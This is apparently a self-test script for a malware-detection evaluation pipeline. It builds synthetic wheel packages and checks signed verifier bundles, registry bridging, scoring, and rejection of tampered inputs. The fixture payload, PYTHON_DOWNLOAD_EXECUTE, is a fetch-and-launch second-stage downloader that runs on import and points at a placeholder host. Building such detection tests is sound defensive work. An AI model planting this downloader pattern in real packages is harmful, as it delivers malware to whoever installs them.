#!/usr/bin/env python3
"""End-to-end inert tests for static verifier bundle assembly and strict scoring."""

from __future__ import annotations

import base64
import copy
import hashlib
import json
import os
import shutil
import subprocess
import tempfile
import zipfile
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[1]
ASSEMBLER = ROOT / "scripts" / "whoathere-static-projection-bundle-assembler.py"
BRIDGE = ROOT / "scripts" / "whoathere-signed-projection-registry-bridge.py"
PUBLISHER = ROOT / "scripts" / "whoathere-run-result-v2-publisher.py"
EVALUATOR = ROOT / "scripts" / "whoathere-actual-malware-evaluation.py"
SCHEMA = ROOT / "scripts" / "whoathere-static-download-execute-projection-schema-v1.json"
MANIFEST = ROOT / "whoathere" / "Cargo.toml"
DEFAULT_VERIFIER = ROOT / "whoathere" / "target" / "debug" / "whoathere-static-projection"

EXECUTION_PROFILE_SHA256 = "sha256:" + "8" * 64
RUN_SPECS = [
    ("inert-static-wheel-a", "wheel-static-v1"),
    ("inert-static-wheel-b", "wheel-static-v1"),
    ("inert-static-wheel-c", "wheel-static-v1"),
]
PYTHON_DOWNLOAD_EXECUTE = b'''import subprocess
import urllib.request

def fetch_and_launch():
    destination = "/tmp/inert-second-stage"
    with urllib.request.urlopen("https://example.invalid/second-stage") as response:
        with open(destination, "wb") as output:
            output.write(response.read())
    subprocess.Popen([destination])

fetch_and_launch()
'''


def require(condition: bool, message: str) -> None:
    if not condition:
        raise AssertionError(message)


def digest(value: bytes) -> str:
    return "sha256:" + hashlib.sha256(value).hexdigest()


def canonical(value: Any) -> bytes:
    return (
        json.dumps(value, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
        + b"\n"
    )


def pretty(value: Any) -> bytes:
    return json.dumps(value, indent=2, sort_keys=True, ensure_ascii=False).encode("utf-8") + b"\n"


def write_json(path: Path, value: Any) -> None:
    path.write_bytes(pretty(value))


def build_verifier() -> Path:
    configured = os.environ.get("WHOATHERE_STATIC_PROJECTION_BIN")
    if configured:
        verifier = Path(configured).expanduser().absolute()
        require(verifier.is_file(), "configured static verifier is unavailable")
        return verifier
    if DEFAULT_VERIFIER.is_file() and os.access(DEFAULT_VERIFIER, os.X_OK):
        return DEFAULT_VERIFIER
    process = subprocess.run(
        [
            "cargo",
            "build",
            "--manifest-path",
            str(MANIFEST),
            "-p",
            "whoathere-runner",
            "--bin",
            "whoathere-static-projection",
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    require(process.returncode == 0, process.stdout + process.stderr)
    require(DEFAULT_VERIFIER.is_file(), "built static verifier is unavailable")
    return DEFAULT_VERIFIER


def key_pair(root: Path, label: str = "verifier") -> tuple[Path, Path]:
    openssl = shutil.which("openssl")
    require(openssl is not None, "openssl is required")
    private = root / f"{label}-private.pem"
    public = root / f"{label}-public.pem"
    subprocess.run(
        [openssl, "genpkey", "-algorithm", "ED25519", "-out", str(private)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
    )
    subprocess.run(
        [openssl, "pkey", "-in", str(private), "-pubout", "-out", str(public)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        check=True,
    )
    return private, public


def wheel_record_hash(value: bytes) -> str:
    encoded = base64.urlsafe_b64encode(hashlib.sha256(value).digest()).rstrip(b"=").decode("ascii")
    return "sha256=" + encoded


def write_member(archive: zipfile.ZipFile, path: str, value: bytes) -> None:
    info = zipfile.ZipInfo(path, date_time=(1980, 1, 1, 0, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = 0o100644 << 16
    archive.writestr(info, value)


def inert_wheel(path: Path, package_name: str, marker: str) -> None:
    normalized = package_name.replace("-", "_")
    dist_info = f"{normalized}-1.0.0.dist-info"
    payload = PYTHON_DOWNLOAD_EXECUTE + f"\n# fixture {marker}\n".encode("utf-8")
    members = [
        (
            f"{dist_info}/METADATA",
            f"Metadata-Version: 2.3\nName: {package_name}\nVersion: 1.0.0\n".encode(),
        ),
        (
            f"{dist_info}/WHEEL",
            b"Wheel-Version: 1.0\nGenerator: whoathere-selftest\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
        ),
        (f"{normalized}/__init__.py", b"from . import client\n"),
        (f"{normalized}/client.py", payload),
    ]
    record_path = f"{dist_info}/RECORD"
    record = "".join(
        f"{member_path},{wheel_record_hash(value)},{len(value)}\n"
        for member_path, value in members
    ) + f"{record_path},,\n"
    with zipfile.ZipFile(path, "w") as archive:
        for member_path, value in members:
            write_member(archive, member_path, value)
        write_member(archive, record_path, record.encode("utf-8"))


def corpus_row(sample_id: str, artifact_path: Path) -> dict[str, Any]:
    return {
        "schema_version": "whoathere.actual_malware.corpus.v1",
        "sample_id": sample_id,
        "sample_kind": "malware",
        "ecosystem": "pypi",
        "package_name": sample_id,
        "package_version": "1.0.0",
        "artifact_filename": artifact_path.name,
        "artifact_sha256": digest(artifact_path.read_bytes()),
        "artifact_size_bytes": artifact_path.stat().st_size,
        "source_type": "lab_benign_fixture",
        "source_reference": "synthetic:static-bundle-assembler",
        "disclosure_date": "2026-07-01",
        "expected_result": "malicious",
        "trigger_phases": ["python_import"],
        "behavior_labels": ["second_stage_fetch"],
        "network_policy": "sinkhole_only",
        "live_c2_allowed": False,
        "second_stage_live_fetch_allowed": False,
        "sync_back_allowed": False,
        "acquisition": {
            "case_id": "static-bundle-assembler-selftest",
            "allowed_test_purpose": "hermetic inert fixture selftest",
            "acquired_at_utc": "2026-07-15T00:00:00Z",
            "collector": "selftest",
            "reviewer": "selftest",
            "authorization": "synthetic-only",
            "custody_store": "temporary-directory",
            "retention_rule": "destroy-on-close",
            "source_confidence": "synthetic",
        },
        "approvals": {
            "two_person_approval": True,
            "legal_provider_approval": True,
            "security_lab_owner": "selftest",
            "whoathere_evaluation_owner": "selftest",
        },
    }


def manifest(
    *,
    corpus_path: Path,
    artifacts: dict[str, Path],
    verifier: Path,
    public_key: Path,
) -> dict[str, Any]:
    return {
        "schema": "whoathere.actual_malware.evaluation_manifest.v2",
        "evaluation_id": "inert-static-assembly",
        "evaluation_class": "known_regression",
        "created_at_utc": "2026-07-14T23:59:00Z",
        "corpus_sha256": digest(corpus_path.read_bytes()),
        "identities": {
            "runtime_sha256": "sha256:" + "1" * 64,
            "prompt_set_sha256": "sha256:" + "2" * 64,
            "observation_schema_sha256": "sha256:" + "3" * 64,
            "provider_adapter_sha256": "sha256:" + "4" * 64,
            "policy_sha256": "sha256:" + "5" * 64,
            "scorer_id": "whoathere-actual-malware-evaluation.py:score-results-v2",
        },
        "verified_evidence_registry": {
            "registry_id": "inert-static-assembly-registry",
            "verifier_id": "whoathere-static-projection-v1",
            "verifier_public_key_sha256": digest(public_key.read_bytes()),
            "verifier_executable_sha256": digest(verifier.read_bytes()),
            "projection_schema_sha256": digest(SCHEMA.read_bytes()),
        },
        "evaluation_window": {
            "starts_at_utc": "2026-07-15T00:00:00Z",
            "ends_at_utc": "2026-07-15T01:00:00Z",
            "maximum_result_to_registry_seconds": 600,
        },
        "thresholds": {
            "malicious_behavior_detection_rate_min": 1.0,
            "benign_false_malicious_rate_max": 0.0,
            "benign_friction_rate_max": 0.0,
            "required_run_completion_rate_min": 1.0,
            "safety_pass_rate_min": 1.0,
        },
        "cohorts": [
            {
                "cohort_id": "inert-malicious",
                "expected_result": "malicious",
                "description": "inert exact static assembly fixtures",
            }
        ],
        "required_runs": [
            {
                "sample_id": sample_id,
                "profile_id": profile_id,
                "cohort_id": "inert-malicious",
                "family_id": "inert-static-family-" + sample_id[-1],
                "campaign_id": "inert-static-campaign-" + sample_id[-1],
                "artifact_sha256": digest(artifacts[sample_id].read_bytes()),
                "execution_profile_sha256": EXECUTION_PROFILE_SHA256,
                "ecosystem": "pypi",
                "expected_result": "malicious",
                "required_behavior_labels": ["second_stage_fetch"],
                "required_modalities": ["deterministic"],
                "require_complete": True,
            }
            for sample_id, profile_id in RUN_SPECS
        ],
    }


def run_inputs(run_id: str) -> dict[str, Any]:
    return {
        "schema": "whoathere.static_projection_bundle_run_fact_inputs.v1",
        "created_at_utc": "2026-07-15T00:01:00Z",
        "verified_at_utc": "2026-07-15T00:02:00Z",
        "run_id": run_id,
        "completion_state": "incomplete",
        "completion_gap_codes": ["deterministic_coverage_incomplete"],
        "coverage": [
            {
                "modality": "deterministic",
                "state": "incomplete",
                "evidence_binding": "static_verifier_source_receipt",
            }
        ],
        "safety": {
            "network_policy": "sinkhole_only",
            "host_package_execution_applied": False,
            "sync_back_applied": False,
            "live_c2_contacted": False,
            "live_second_stage_fetched": False,
            "restricted_material_leak": False,
            "teardown_verified": True,
        },
    }


def assemble(
    *,
    directory: Path,
    manifest_path: Path,
    manifest_sha256: str,
    sample_id: str,
    profile_id: str,
    artifact: Path,
    verifier: Path,
    public_key: Path,
    private_key: Path,
    run_input_path: Path,
    schema: Path = SCHEMA,
) -> tuple[subprocess.CompletedProcess[str], dict[str, Path]]:
    outputs = {
        "metadata": directory / "static-verifier-metadata.json",
        "bundle": directory / "verified-projection-bundle.json",
        "signature": directory / "verified-projection-bundle.sig",
        "result": directory / "run-result.json",
    }
    process = subprocess.run(
        [
            "python3",
            "-B",
            str(ASSEMBLER),
            "--evaluation-manifest",
            str(manifest_path),
            "--expected-evaluation-manifest-sha256",
            manifest_sha256,
            "--sample-id",
            sample_id,
            "--profile-id",
            profile_id,
            "--artifact",
            str(artifact),
            "--artifact-acquired-at",
            "2026-07-15T00:00:30Z",
            "--verifier-id",
            "whoathere-static-projection-v1",
            "--verifier-executable",
            str(verifier),
            "--projection-schema",
            str(schema),
            "--verifier-public-key",
            str(public_key),
            "--verifier-signing-private-key",
            str(private_key),
            "--run-fact-inputs",
            str(run_input_path),
            "--out-static-verifier-metadata",
            str(outputs["metadata"]),
            "--out-bundle",
            str(outputs["bundle"]),
            "--out-signature",
            str(outputs["signature"]),
            "--out-run-result",
            str(outputs["result"]),
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    return process, outputs


def bridge(
    *,
    directory: Path,
    manifest_path: Path,
    manifest_sha256: str,
    run_index: Path,
    public_key: Path,
    private_key: Path,
) -> tuple[subprocess.CompletedProcess[str], Path, Path]:
    registry = directory / "verified-evidence-registry.json"
    signature = directory / "verified-evidence-registry.sig"
    process = subprocess.run(
        [
            "python3",
            "-B",
            str(BRIDGE),
            "--evaluation-manifest",
            str(manifest_path),
            "--expected-evaluation-manifest-sha256",
            manifest_sha256,
            "--run-index",
            str(run_index),
            "--verifier-public-key",
            str(public_key),
            "--registry-signing-private-key",
            str(private_key),
            "--out-registry",
            str(registry),
            "--out-signature",
            str(signature),
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    return process, registry, signature


def score(
    *,
    directory: Path,
    corpus: Path,
    manifest_path: Path,
    results: list[Path],
    registry: Path,
    public_key: Path,
    registry_signature: Path,
) -> subprocess.CompletedProcess[str]:
    results_path = directory / "run-results.jsonl"
    results_path.write_text(
        "".join(
            json.dumps(json.loads(path.read_text(encoding="utf-8")), sort_keys=True) + "\n"
            for path in results
        ),
        encoding="utf-8",
    )
    return subprocess.run(
        [
            "python3",
            "-B",
            str(EVALUATOR),
            "score-results",
            "--corpus",
            str(corpus),
            "--results",
            str(results_path),
            "--evaluation-manifest",
            str(manifest_path),
            "--verified-evidence-registry",
            str(registry),
            "--verified-evidence-public-key",
            str(public_key),
            "--verified-evidence-signature",
            str(registry_signature),
        ],
        cwd=ROOT,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )


def case_directory(root: Path, name: str) -> Path:
    path = root / name
    path.mkdir()
    return path


def main() -> int:
    checks = 0
    verifier = build_verifier()
    with tempfile.TemporaryDirectory(prefix="whoathere-static-bundle-assembler-selftest-") as raw_tmp:
        root = Path(raw_tmp)
        private_key, public_key = key_pair(root)
        artifacts: dict[str, Path] = {}
        for index, (sample_id, _) in enumerate(RUN_SPECS):
            artifact = root / f"{sample_id.replace('-', '_')}-1.0.0-py3-none-any.whl"
            inert_wheel(artifact, sample_id, str(index))
            artifacts[sample_id] = artifact

        corpus_path = root / "corpus.jsonl"
        corpus_path.write_text(
            "".join(
                json.dumps(corpus_row(sample_id, artifacts[sample_id]), sort_keys=True) + "\n"
                for sample_id, _ in RUN_SPECS
            ),
            encoding="utf-8",
        )
        manifest_value = manifest(
            corpus_path=corpus_path,
            artifacts=artifacts,
            verifier=verifier,
            public_key=public_key,
        )
        manifest_path = root / "evaluation-manifest.json"
        write_json(manifest_path, manifest_value)
        manifest_sha256 = digest(manifest_path.read_bytes())

        assembled: dict[str, dict[str, Path]] = {}
        for sample_id, profile_id in RUN_SPECS:
            directory = case_directory(root, "assembled-" + sample_id)
            run_input_path = directory / "run-fact-inputs.json"
            run_input_path.write_bytes(canonical(run_inputs("run-" + sample_id)))
            process, outputs = assemble(
                directory=directory,
                manifest_path=manifest_path,
                manifest_sha256=manifest_sha256,
                sample_id=sample_id,
                profile_id=profile_id,
                artifact=artifacts[sample_id],
                verifier=verifier,
                public_key=public_key,
                private_key=private_key,
                run_input_path=run_input_path,
            )
            require(process.returncode == 0, process.stdout + process.stderr)
            assembled[sample_id] = outputs
            metadata = json.loads(outputs["metadata"].read_text(encoding="utf-8"))
            bundle = json.loads(outputs["bundle"].read_text(encoding="utf-8"))
            require(metadata["projection_count"] == len(bundle["projections"]) > 0, str(metadata))
            require(bundle["projections"] == metadata["projections"], "assembler changed verifier projections")
            require(bundle["run_fact"]["artifact_sha256"] == digest(artifacts[sample_id].read_bytes()), str(bundle))
        checks += 1

        bridge_dir = case_directory(root, "bridge")
        run_index = bridge_dir / "run-index.json"
        run_index.write_bytes(
            canonical(
                {
                    "schema": "whoathere.actual_malware.signed_projection_run_index.v1",
                    "evaluation_manifest_sha256": manifest_sha256,
                    "runs": [
                        {
                            "sample_id": sample_id,
                            "profile_id": profile_id,
                            "verified_projection_bundle": str(assembled[sample_id]["bundle"]),
                            "verified_projection_signature": str(assembled[sample_id]["signature"]),
                            "run_result": str(assembled[sample_id]["result"]),
                        }
                        for sample_id, profile_id in RUN_SPECS
                    ],
                }
            )
        )
        bridge_process, registry, registry_signature = bridge(
            directory=bridge_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            run_index=run_index,
            public_key=public_key,
            private_key=private_key,
        )
        require(bridge_process.returncode == 0, bridge_process.stdout + bridge_process.stderr)
        checks += 1

        score_process = score(
            directory=bridge_dir,
            corpus=corpus_path,
            manifest_path=manifest_path,
            results=[assembled[sample_id]["result"] for sample_id, _ in RUN_SPECS],
            registry=registry,
            public_key=public_key,
            registry_signature=registry_signature,
        )
        require(score_process.returncode == 20, score_process.stdout + score_process.stderr)
        report = json.loads(score_process.stdout)
        require(report["passed"] is False and report["validation_errors"] == [], str(report))
        require(report["rates"]["malicious_behavior_detection"] == 1.0, str(report))
        require(report["rates"]["required_run_completion"] == 0.0, str(report))
        checks += 1

        first_sample, first_profile = RUN_SPECS[0]
        base_inputs = run_inputs("run-negative")

        artifact_tamper_dir = case_directory(root, "artifact-tamper")
        tampered_artifact = artifact_tamper_dir / artifacts[first_sample].name
        tampered_artifact.write_bytes(artifacts[first_sample].read_bytes() + b"tamper")
        tamper_inputs = artifact_tamper_dir / "run-inputs.json"
        tamper_inputs.write_bytes(canonical(base_inputs))
        artifact_tamper, _ = assemble(
            directory=artifact_tamper_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=tampered_artifact,
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=tamper_inputs,
        )
        require(
            artifact_tamper.returncode == 20 and "static_verifier_failed_exit_65" in artifact_tamper.stderr,
            artifact_tamper.stderr,
        )
        checks += 1

        slot_dir = case_directory(root, "slot-mismatch")
        slot_inputs = slot_dir / "run-inputs.json"
        slot_inputs.write_bytes(canonical(base_inputs))
        slot_process, _ = assemble(
            directory=slot_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id="unknown-profile",
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=slot_inputs,
        )
        require(
            slot_process.returncode == 20 and "manifest_run_slot_not_unique" in slot_process.stderr,
            slot_process.stderr,
        )
        checks += 1

        timestamp_dir = case_directory(root, "timestamp-order")
        bad_timestamp_inputs = copy.deepcopy(base_inputs)
        bad_timestamp_inputs["verified_at_utc"] = "2026-07-15T00:00:45Z"
        timestamp_inputs = timestamp_dir / "run-inputs.json"
        timestamp_inputs.write_bytes(canonical(bad_timestamp_inputs))
        timestamp_process, _ = assemble(
            directory=timestamp_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=timestamp_inputs,
        )
        require(
            timestamp_process.returncode == 20 and "run_fact_timestamp_order_invalid" in timestamp_process.stderr,
            timestamp_process.stderr,
        )
        checks += 1

        key_dir = case_directory(root, "wrong-signing-key")
        wrong_private, _ = key_pair(key_dir, "wrong")
        key_inputs = key_dir / "run-inputs.json"
        key_inputs.write_bytes(canonical(base_inputs))
        key_process, _ = assemble(
            directory=key_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=wrong_private,
            run_input_path=key_inputs,
        )
        require(
            key_process.returncode == 20 and "bundle_signing_key_mismatch" in key_process.stderr,
            key_process.stderr,
        )
        checks += 1

        executable_dir = case_directory(root, "executable-drift")
        changed_verifier = executable_dir / "whoathere-static-projection"
        changed_verifier.write_bytes(verifier.read_bytes() + b"drift")
        changed_verifier.chmod(0o755)
        executable_inputs = executable_dir / "run-inputs.json"
        executable_inputs.write_bytes(canonical(base_inputs))
        executable_process, _ = assemble(
            directory=executable_dir,
            manifest_path=manifest_path,
            manifest_sha256=manifest_sha256,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=changed_verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=executable_inputs,
        )
        require(
            executable_process.returncode == 20
            and "verifier_executable_sha256_pin_mismatch" in executable_process.stderr,
            executable_process.stderr,
        )
        checks += 1

        manifest_digest_dir = case_directory(root, "manifest-digest-drift")
        manifest_digest_inputs = manifest_digest_dir / "run-inputs.json"
        manifest_digest_inputs.write_bytes(canonical(base_inputs))
        manifest_digest_process, _ = assemble(
            directory=manifest_digest_dir,
            manifest_path=manifest_path,
            manifest_sha256="sha256:" + "0" * 64,
            sample_id=first_sample,
            profile_id=first_profile,
            artifact=artifacts[first_sample],
            verifier=verifier,
            public_key=public_key,
            private_key=private_key,
            run_input_path=manifest_digest_inputs,
        )
        require(
            manifest_digest_process.returncode == 20
            and "evaluation_manifest_digest_mismatch" in manifest_digest_process.stderr,
            manifest_digest_process.stderr,
        )
        checks += 1

        bundle_tamper_dir = case_directory(root, "bundle-tamper")
        original_bundle = json.loads(assembled[first_sample]["bundle"].read_text(encoding="utf-8"))
        original_bundle["run_fact"]["run_id"] = "tampered-run-id"
        tampered_bundle = bundle_tamper_dir / "bundle.json"
        tampered_bundle.write_bytes(canonical(original_bundle))
        publisher_out = bundle_tamper_dir / "run-result.json"
        publisher_process = subprocess.run(
            [
                "python3",
                "-B",
                str(PUBLISHER),
                "--evaluation-manifest",
                str(manifest_path),
                "--expected-evaluation-manifest-sha256",
                manifest_sha256,
                "--sample-id",
                first_sample,
                "--profile-id",
                first_profile,
                "--verified-projection-bundle",
                str(tampered_bundle),
                "--verified-projection-signature",
                str(assembled[first_sample]["signature"]),
                "--verifier-public-key",
                str(public_key),
                "--out",
                str(publisher_out),
            ],
            cwd=ROOT,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        require(
            publisher_process.returncode == 20 and "projection_signature_invalid" in publisher_process.stderr,
            publisher_process.stderr,
        )
        checks += 1

    print(f"static projection bundle assembler self-test passed ({checks} checks)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
